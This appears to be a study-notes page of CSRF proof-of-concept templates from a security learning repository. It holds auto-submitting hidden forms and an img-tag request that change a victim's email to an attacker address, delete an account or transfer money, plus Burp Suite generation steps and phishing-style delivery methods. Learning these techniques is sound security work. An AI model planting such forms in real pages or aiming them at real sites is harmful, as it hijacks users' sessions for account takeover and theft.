# CSRF HTML PoC Templates

## Basic POST Request PoC

```html
<html>
  <body>
    <form action="https://victim-site.com/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>

    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

# GET Request CSRF

```html
<img src="https://victim-site.com/delete-account">
```

---

# Auto-Submit Form

```html
<script>
    document.forms[0].submit();
</script>
```

---

# Hidden Input Example

```html
<input type="hidden" name="email" value="attacker@evil.com">
```

---

# Multiple Parameters Example

```html
<form action="https://victim-site.com/transfer" method="POST">
    <input type="hidden" name="account" value="attacker">
    <input type="hidden" name="amount" value="5000">
</form>
```

---

# Burp Suite Generated PoC

```text
Right Click Request
        ↓
Engagement Tools
        ↓
Generate CSRF PoC
```

---

# Why Cookies Are Missing

Cookies are NOT manually added.

Browsers automatically attach them during requests.

---

# Common Delivery Methods

- phishing emails
- malicious links
- attacker-controlled websites
- compromised websites

---

# Related Theory

- `Theory/04-how-to-construct-a-csrf-attack.md`

---

# Related Labs

- `Labs/lab01-basic-csrf.md`

---

# Key Takeaways

- CSRF PoCs are usually simple hidden forms.
- Auto-submit JavaScript removes user interaction.
- Browser behavior performs the real attack.

> [!TIP]
> Always verify whether cookies are attached automatically during testing.